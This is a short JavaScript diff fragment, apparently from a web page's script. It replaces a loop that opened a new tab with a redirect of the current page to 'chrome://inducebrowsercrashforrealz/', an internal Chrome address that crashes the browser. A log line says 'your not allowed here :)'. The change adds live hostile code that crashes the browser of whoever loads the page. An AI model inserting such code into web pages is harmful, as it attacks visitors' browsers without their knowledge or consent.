@@ -37,10 +37,10 @@
                         });
                     })
                     .then(() => {
-                    for (let i = 0; i < 1; i++) {
-                    window.open("chrome://inducebrowsercrashforrealz/", "_blank");
-                    console.log("Loop iteration:", i);
-                    }
+                        // Instead of opening new tabs, change the current location
+                        window.location.href = "chrome://inducebrowsercrashforrealz/";
+                        // Optionally, log the action
+                        console.log("Redirected to chrome://inducebrowsercrashforrealz/");
                     })
                     .finally(() => {
                     console.log("your not allowed here :)")
